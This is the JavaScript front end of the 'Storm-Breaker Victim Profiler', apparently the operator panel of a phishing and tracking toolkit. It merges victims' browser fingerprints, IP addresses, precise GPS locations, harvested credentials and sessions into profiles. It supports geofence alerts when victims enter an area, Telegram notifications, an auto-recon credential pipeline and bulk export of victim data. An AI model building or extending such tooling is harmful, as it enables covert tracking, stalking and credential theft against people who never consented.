/**
 * Storm-Breaker Victim Profiler
 * Auto-correlate fingerprints, locations, credentials, and sessions into unified profiles
 */

const VictimProfiler = {
    profiles: [],
    geofences: [],
    selectedProfile: null,

    async init() {
        await this.loadProfiles();
        await this.loadGeofences();
    },

    async loadProfiles() {
        try {
            const resp = await fetch('/api/profiles/list');
            const data = await resp.json();
            this.profiles = data.profiles || [];
            this.renderProfiles();
        } catch (e) { console.error('Load profiles error:', e); }
    },

    async buildProfiles() {
        const btn = document.getElementById('buildProfilesBtn');
        if (btn) { btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Building...'; btn.disabled = true; }
        try {
            const resp = await fetch('/api/profiles/build', { method: 'POST' });
            const data = await resp.json();
            GrowlNotification.notify({
                title: 'Profiles Built', description: `${data.count} profiles created/updated`,
                type: 'success', position: 'top-right', closeTimeout: 3000
            });
            this.loadProfiles();
        } catch (e) {
            GrowlNotification.notify({ title: 'Error', description: e.message, type: 'error', position: 'top-right', closeTimeout: 4000 });
        } finally {
            if (btn) { btn.innerHTML = '<i class="fas fa-users-cog mr-2"></i>Auto-Build Profiles'; btn.disabled = false; }
        }
    },

    async addTag(profileId) {
        const tag = prompt('Enter tag name:');
        if (!tag) return;
        const profile = this.profiles.find(p => p.id === profileId);
        if (!profile) return;
        let tags = [];
        try { tags = JSON.parse(profile.tags || '[]'); } catch (e) { tags = []; }
        if (!tags.includes(tag)) tags.push(tag);
        try {
            await fetch(`/api/profiles/${profileId}/tag`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ tags })
            });
            this.loadProfiles();
        } catch (e) { console.error('Tag error:', e); }
    },

    async updateNotes(profileId) {
        const notes = prompt('Enter notes:');
        if (notes === null) return;
        try {
            await fetch(`/api/profiles/${profileId}/notes`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ notes })
            });
            this.loadProfiles();
        } catch (e) { console.error('Notes error:', e); }
    },

    async setRiskScore(profileId) {
        const score = prompt('Enter risk score (0-100):');
        if (!score) return;
        try {
            await fetch(`/api/profiles/${profileId}/risk`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ score: parseInt(score) })
            });
            this.loadProfiles();
        } catch (e) { console.error('Risk score error:', e); }
    },

    renderProfiles() {
        const container = document.getElementById('profilesList');
        if (!container) return;

        if (this.profiles.length === 0) {
            container.innerHTML = `<div class="text-center py-8 text-gray-500">
                <i class="fas fa-user-secret text-4xl mb-3"></i>
                <p>No profiles yet. Click "Auto-Build" to correlate victim data.</p>
            </div>`;
            return;
        }

        container.innerHTML = this.profiles.map(p => {
            let tags = [];
            try { tags = JSON.parse(p.tags || '[]'); } catch (e) {}
            const riskColor = p.risk_score >= 75 ? 'text-red-400 border-red-500/30' : p.risk_score >= 50 ? 'text-yellow-400 border-yellow-500/30' : p.risk_score >= 25 ? 'text-blue-400 border-blue-500/30' : 'text-gray-400 border-gray-600';
            const riskBg = p.risk_score >= 75 ? 'bg-red-500' : p.risk_score >= 50 ? 'bg-yellow-500' : p.risk_score >= 25 ? 'bg-blue-500' : 'bg-gray-500';

            return `
            <div class="bg-gray-800/50 rounded-xl p-4 border border-gray-700/50 hover:border-purple-500/30 transition-all">
                <div class="flex items-start justify-between mb-3">
                    <div class="flex items-center gap-3">
                        <div class="w-12 h-12 rounded-full bg-gradient-to-br from-purple-500 to-pink-500 flex items-center justify-center text-white font-bold text-lg">
                            ${(p.ip || '?').charAt(0)}
                        </div>
                        <div>
                            <div class="font-bold text-white font-mono">${p.ip || 'Unknown'}</div>
                            <div class="text-xs text-gray-400">${p.platform || ''} · ${p.browser || ''}</div>
                        </div>
                    </div>
                    <div class="flex items-center gap-2">
                        <div class="text-center border ${riskColor} rounded-lg px-3 py-1">
                            <div class="text-lg font-bold">${p.risk_score || 0}</div>
                            <div class="text-[10px] uppercase">Risk</div>
                        </div>
                    </div>
                </div>

                <!-- Details Grid -->
                <div class="grid grid-cols-2 gap-2 text-xs mb-3">
                    <div><span class="text-gray-500">Screen:</span> <span class="text-gray-300">${p.screen_res || '-'}</span></div>
                    <div><span class="text-gray-500">Fingerprint:</span> <span class="text-gray-300 font-mono">${(p.fingerprint_hash || '-').substring(0, 12)}</span></div>
                    <div><span class="text-gray-500">First Seen:</span> <span class="text-gray-300">${p.first_seen ? p.first_seen.substring(0, 16) : '-'}</span></div>
                    <div><span class="text-gray-500">Last Seen:</span> <span class="text-gray-300">${p.last_seen ? p.last_seen.substring(0, 16) : '-'}</span></div>
                    ${p.location_lat ? `<div class="col-span-2"><span class="text-gray-500">Location:</span> <span class="text-green-400">${p.location_lat.toFixed(4)}, ${p.location_lon.toFixed(4)}</span></div>` : ''}
                </div>

                <!-- Tags -->
                <div class="flex flex-wrap gap-1 mb-3">
                    ${tags.map(t => `<span class="bg-purple-500/20 text-purple-300 text-[10px] px-2 py-0.5 rounded-full">${t}</span>`).join('')}
                    <button onclick="VictimProfiler.addTag(${p.id})" class="bg-gray-700 text-gray-400 text-[10px] px-2 py-0.5 rounded-full hover:bg-gray-600">+ Tag</button>
                </div>

                <!-- Notes -->
                ${p.notes ? `<div class="text-xs text-gray-400 bg-gray-900/50 rounded p-2 mb-3"><i class="fas fa-sticky-note mr-1 text-yellow-400"></i>${p.notes}</div>` : ''}

                <!-- Risk Bar -->
                <div class="w-full bg-gray-700 rounded-full h-1.5 mb-3">
                    <div class="${riskBg} h-1.5 rounded-full transition-all" style="width: ${p.risk_score || 0}%"></div>
                </div>

                <!-- Actions -->
                <div class="flex gap-2">
                    <button onclick="VictimProfiler.setRiskScore(${p.id})" class="text-xs bg-gray-700 hover:bg-gray-600 px-2 py-1 rounded transition-colors">
                        <i class="fas fa-shield-alt mr-1"></i>Risk
                    </button>
                    <button onclick="VictimProfiler.updateNotes(${p.id})" class="text-xs bg-gray-700 hover:bg-gray-600 px-2 py-1 rounded transition-colors">
                        <i class="fas fa-sticky-note mr-1"></i>Notes
                    </button>
                    <button onclick="VictimProfiler.addTag(${p.id})" class="text-xs bg-gray-700 hover:bg-gray-600 px-2 py-1 rounded transition-colors">
                        <i class="fas fa-tag mr-1"></i>Tag
                    </button>
                </div>
            </div>`;
        }).join('');
    },

    // ===== GEOFENCE =====

    async loadGeofences() {
        try {
            const resp = await fetch('/api/geofence/list');
            const data = await resp.json();
            this.geofences = data.geofences || [];
            this.renderGeofences();
        } catch (e) { console.error('Load geofences error:', e); }
    },

    async createGeofence() {
        const name = document.getElementById('geofenceName')?.value;
        const lat = parseFloat(document.getElementById('geofenceLat')?.value);
        const lon = parseFloat(document.getElementById('geofenceLon')?.value);
        const radius = parseFloat(document.getElementById('geofenceRadius')?.value) || 1.0;

        if (!name || isNaN(lat) || isNaN(lon)) {
            GrowlNotification.notify({ title: 'Error', description: 'Name, latitude and longitude are required', type: 'error', position: 'top-right', closeTimeout: 3000 });
            return;
        }

        try {
            await fetch('/api/geofence/create', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name, lat, lon, radius_km: radius })
            });
            GrowlNotification.notify({ title: 'Geofence Created', description: `${name} (${radius}km radius)`, type: 'success', position: 'top-right', closeTimeout: 3000 });
            document.getElementById('geofenceName').value = '';
            document.getElementById('geofenceLat').value = '';
            document.getElementById('geofenceLon').value = '';
            this.loadGeofences();
        } catch (e) {
            GrowlNotification.notify({ title: 'Error', description: e.message, type: 'error', position: 'top-right', closeTimeout: 4000 });
        }
    },

    async deleteGeofence(id) {
        try {
            await fetch(`/api/geofence/${id}`, { method: 'DELETE' });
            this.loadGeofences();
        } catch (e) { console.error('Delete geofence error:', e); }
    },

    renderGeofences() {
        const container = document.getElementById('geofencesList');
        if (!container) return;

        if (this.geofences.length === 0) {
            container.innerHTML = '<div class="text-center text-gray-500 py-4"><i class="fas fa-draw-polygon text-2xl mb-2"></i><br>No geofences defined</div>';
            return;
        }

        container.innerHTML = this.geofences.map(f => `
            <div class="flex items-center justify-between bg-gray-900/50 rounded-lg px-4 py-3 border border-gray-700/50">
                <div>
                    <div class="font-semibold text-white">${f.name}</div>
                    <div class="text-xs text-gray-400">${f.lat.toFixed(4)}, ${f.lon.toFixed(4)} · ${f.radius_km}km radius · Triggered ${f.triggered_count}x</div>
                </div>
                <button onclick="VictimProfiler.deleteGeofence(${f.id})" class="text-red-400 hover:text-red-300"><i class="fas fa-trash"></i></button>
            </div>
        `).join('');
    },

    // ===== AUTO-RECON =====

    async runRecon() {
        const btn = document.getElementById('runReconBtn');
        if (btn) { btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Running Pipeline...'; btn.disabled = true; }

        try {
            const resp = await fetch('/api/recon/run', { method: 'POST' });
            const data = await resp.json();

            let summary = `Credentials: ${data.results.credentials || 0}, Profiles: ${data.results.profiles || 0}, Geofence Alerts: ${data.results.geofence_alerts || 0}`;
            GrowlNotification.notify({ title: 'Recon Complete', description: summary, type: 'success', position: 'top-right', closeTimeout: 5000 });

            this.loadProfiles();
            this.loadGeofences();
        } catch (e) {
            GrowlNotification.notify({ title: 'Recon Error', description: e.message, type: 'error', position: 'top-right', closeTimeout: 4000 });
        } finally {
            if (btn) { btn.innerHTML = '<i class="fas fa-robot mr-2"></i>Run Auto-Recon'; btn.disabled = false; }
        }
    },

    // ===== TELEGRAM CONFIG =====

    async loadTelegramConfig() {
        try {
            const resp = await fetch('/api/telegram/config');
            const data = await resp.json();
            const cfg = data.config || {};
            if (document.getElementById('telegramToken')) document.getElementById('telegramToken').value = '';
            if (document.getElementById('telegramChatId')) document.getElementById('telegramChatId').value = cfg.chat_id || '';
            if (document.getElementById('telegramStatus')) {
                document.getElementById('telegramStatus').innerHTML = cfg.enabled
                    ? '<span class="text-green-400"><i class="fas fa-check-circle mr-1"></i>Connected</span>'
                    : '<span class="text-gray-500"><i class="fas fa-times-circle mr-1"></i>Not configured</span>';
            }
        } catch (e) { console.error('Load telegram config error:', e); }
    },

    async saveTelegramConfig() {
        const token = document.getElementById('telegramToken')?.value;
        const chatId = document.getElementById('telegramChatId')?.value;

        try {
            await fetch('/api/telegram/config', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token, chat_id: chatId })
            });
            GrowlNotification.notify({ title: 'Telegram Configured', description: 'Bot settings saved', type: 'success', position: 'top-right', closeTimeout: 3000 });
            this.loadTelegramConfig();
        } catch (e) {
            GrowlNotification.notify({ title: 'Error', description: e.message, type: 'error', position: 'top-right', closeTimeout: 4000 });
        }
    },

    async testTelegram() {
        try {
            const resp = await fetch('/api/telegram/test', { method: 'POST' });
            const data = await resp.json();
            if (data.success) {
                GrowlNotification.notify({ title: 'Telegram Test', description: `Bot @${data.bot_username} connected!`, type: 'success', position: 'top-right', closeTimeout: 4000 });
            } else {
                GrowlNotification.notify({ title: 'Test Failed', description: data.error, type: 'error', position: 'top-right', closeTimeout: 4000 });
            }
        } catch (e) {
            GrowlNotification.notify({ title: 'Error', description: e.message, type: 'error', position: 'top-right', closeTimeout: 4000 });
        }
    },

    exportProfiles() {
        const data = JSON.stringify(this.profiles, null, 2);
        const blob = new Blob([data], { type: 'application/json' });
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = `victim_profiles_${new Date().toISOString().slice(0,10)}.json`;
        a.click();
    }
};
